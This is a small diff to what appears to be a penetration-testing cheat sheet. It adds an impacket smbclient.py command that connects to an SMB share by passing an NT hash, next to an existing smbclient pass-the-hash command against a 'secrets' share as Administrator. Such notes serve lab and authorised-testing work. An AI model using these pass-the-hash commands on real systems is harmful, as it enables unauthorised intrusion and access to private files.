@@ -4497,6 +4497,8 @@ mget *
 
 # Command connect share with hash password
 smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+or
+smbclient.py SKYLARK/k.smith@10.20.167.111 -hashes :d2a87ca4d6735870dc2357a83960c379
 
 
 ```
